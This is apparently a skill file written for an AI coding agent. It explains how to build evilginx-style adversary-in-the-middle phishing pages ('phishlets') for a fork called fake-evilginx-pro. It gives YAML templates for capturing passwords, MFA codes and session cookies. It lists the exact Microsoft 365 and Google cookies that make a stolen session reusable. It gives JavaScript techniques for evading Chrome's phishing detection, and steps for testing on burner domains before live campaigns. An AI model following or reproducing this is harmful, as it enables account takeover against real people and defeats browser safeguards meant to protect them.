---
name: creating-phishlets
description: Author phishing phishlets for fake-evilginx-pro (the evilginx2 fork in this workspace). Use when asked to create, adapt, or debug a phishlet YAML for a new identity provider, add credential capture, auth_tokens, sub_filters, token-gating, or CSD hardening. Covers this fork's specific extensions (relay lures, AES params, rewrite_urls).
---

# Creating phishlets for fake-evilginx-pro

You are authoring a phishlet for the **fake-evilginx-pro** fork (evilginx2 CE 3.3.0
base). Phishlets live on the node at `phishlets/` (or `<repo>/src/phishlets/` for local
testing) — they are **gitignored by design** (campaign data, never commit/push).

Scaffold with `python tools/make_phishlet.py <name> <origin-domain>` then fill in.

## YAML structure (this fork)

```yaml
name: <provider>                     # unique
proxy_hosts:                         # hosts we proxy + fabricate
  - hostname: {accounts.<BASE>.<ZONE>}   # literal template var
    phish_sub: accounts              # MUST be unique across ENABLED phishlets
    origin: https://login.provider.com
    is_landing: true
    sub_filters:                     # rewrite embedded absolute URLs
      - {hostname: login.provider.com, sub: accounts,
         search: login.provider.com, replace: accounts.{hostname}}
credentials:                         # PILLAR 1: username/password capture
  username: {key: loginfmt, search: '...', type: post}
  password:  {key: passwd,  search: '...', type: post}
  custom:                            # PILLAR 2: extra tokens (OTP, claims)
    - {domain: login.provider.com, keys: ['OTP'], type: post}
login:
  domain: login.provider.com
auth_tokens:                         # PILLAR 3: session-completing cookies
  - domain: .provider.com
    keys: ['SESSION', 'PERSIST']
```

### The three capture pillars — get all three or the phishlet is a toy

1. **credentials** — where the username/password appear in POST bodies. Inspect the real
   login flow (browser devtools → copy-as-cURL). Regex allowed when values hide inside
   JSON-RPC blobs (Google: email extracted by regex from the `f.req` POST field).
2. **custom** — anything else worth logging (TOTP codes, recovery emails).
3. **auth_tokens** — the cookie set that makes the session REUSABLE. Test by importing
   into a fresh browser: no login wall = right set. Proven sets: ms365 consumer =
   `WLSSC`, ms365 work = `ESTSAUTHPERSISTENT` (login.live.com), google = the
   `.google.com` family (`SID`, `__Secure-1PSID`, `__Secure-3PSID`, `SAPISID`,
   `HSID`, `SSID`, `APISID`). Track tokens across ALL auth domains the flow visits.

## Hard rules (each one caused a real incident)

| Rule | Why |
|---|---|
| `phish_sub` unique across **enabled** phishlets on one base domain | host→phishlet map is a Go map; collisions = random cross-redirects between flows |
| `general.domain` == current base domain | changing only phishlet hostnames leaves sub-filters rendering dead absolute URLs → victim JS aborts mid-flow |
| Rewrite **both directions** | every absolute URL origin-embedded must map to the fabricated host and back; test a FULL flow, not just landing |
| Token values in `search` regexes must be anchored enough not to match URL params | e.g. hostname checks in code must use parsed hostname, never substring over the whole URL (a `continue=` param once caused false "done") |
| Autocomplete/hidden fields | capture rules must target the VISIBLE field — hidden prefilled inputs (e.g. hiddenPassword) silently match first and capture empty values |

## Lure options (fork extensions)

- **token-gate** (default via API): lure carries `token: auto`; requests without
  `?t=<token>` get a 302 to `redirect_url`. Always set a plausible benign redirect
  (product marketing page). NEVER reuse tokens across campaigns; never log them.
- **relay: true** (Google-type targets with origin-bound anti-bot): the lure serves the
  real-browser relay page instead of a MITM session — see
  `docs/google-relay.md` + `tools/relay/`. Do NOT try to MITM accounts.google.com;
  it is proven impossible (botguard is origin-bound).

## CSD hardening (Chrome client-side detection) — required on password hosts

Add to the landing phishlet's `js_inject` (patterns proven in ms365/google):

1. **Password DOM disguise**: replace `input[type=password]` with `type=text` +
   `-webkit-text-security:disc`, keep a MutationObserver re-applying it, submit value
   unchanged. The DOM then contains no password field for CSPD to classify.
2. **Brand lazy-reveal**: hide logo/brand assets at load (style class), remove on first
   `pointermove/keydown/touchstart`. The classifier screenshots before interaction.

Verify like-for-like: SB-enabled Chrome, full flow, no Dangerous flag — on a **burner**
domain, never the campaign one.

## Testing procedure (in order)

1. YAML loads: `phishlets reload` via console/MCP; no parse errors in log.
2. Render via trusted loopback (botguard lets 127.0.0.1 through):
   `curl -sk -L -c /tmp/cj -A "<browser UA>" --resolve <host>:443:127.0.0.1 "https://<host>/<lure>?t=<token>"`.
3. Full flow with a test account: identifier → password → MFA → landed app.
4. `sessions` shows capture with all 3 pillars; export cookies, replay in a browser
   (MCP `open_session`), confirm no login wall.
5. Detection check from a burner domain; only then campaign.

## Reference phishlets on the node

`ms365.yaml` (gold standard: 15 proxy_hosts, telemetry hosts, CSD hardening, consumer
+ work token sets) and `google.yaml` (relay-based). Read them before writing a new one.

## Gotchas

- Some providers need extra telemetry hosts allow-listed in `proxy_hosts` or their JS
  dies silently (Microsoft play.googleapis, Google play/gapi/ogs hosts).
- Unknown SNI = silent drop = browser hang (hostname typo, not an error page).
- `301/302 to /` on first hop is NORMAL for ms365 (hop 1 of the OAuth dance).
- Empty password capture can be correct (passwordless accounts).
